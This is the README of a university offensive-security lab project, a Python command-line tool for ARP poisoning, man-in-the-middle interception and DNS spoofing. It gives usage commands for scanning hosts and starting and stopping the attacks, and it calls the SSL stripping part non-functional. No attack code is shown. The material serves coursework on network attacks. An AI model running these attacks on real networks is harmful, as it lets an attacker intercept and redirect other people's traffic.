# ocs
This repository contains a command-line tool to perform ARP and DNS poisoning attacks. Also included are (currently non-functional) efforts towards SSL stripping.
This is the default project for _Lab on Offensive Computer Security_ (2ic80) at TU/e.

## Dependencies
The tool was made to run on a VM setup with old linux versions, and as such depends on some outdated software.
A linux system using iptables and sysctl is required, as well as python 2.7 (e.g. in a virtual environment).
Before first use, install the required python packages by:
```
# python -m pip install -r requirements.txt
```

## Example usage
To start the program, run:
```
# python cli.py
```
Note that root priviliges are required to modify packets.
The interface is automatically set to match the default gateway. It can also be set manually:
```
>>> set iface enp0s3
```
Before any attack, we first need to scan for hosts:
```
>>> scan
gateway at 192.168.18.1
0: host at 192.168.18.2
1: host at 192.168.18.3
2: host at 192.168.18.4
```

### ARP poisoning example
We perform an ARP poisoning attack against 192.168.18.4 as follows:
```
>>> arp mitm 2
```
Now all traffic between the target and the gateway goes via the attacker's system. It is therefore subject to the rules defined in the attacker's iptables configuration.
We stop the ARP poisoning attack:
```
>>> arp stop 2
```

### DNS poisoning example
For the DNS poisoning attack, we first specify the desired URL/IP combinations:
```
>>> dns add 2
URL to spoof: *.example.com
IP address to lead to (leave empty for own IP address): 1.2.3.4
```
Next, we start the DNS poisoning attack:
```
>>> dns poison 2
DNS poisoning attack started
```
The DNS poisoning attack relies on a running MITM ARP poisoning attack in order to modify DNS responses. However, the tool will do this automatically.
We stop the DNS poisoning attack:
```
>>> dns stop 2
DNS poisoning attack stopped
```
We also need to stop the ARP poisoning attack that was started automatically:
```
>>> arp stop 2
```
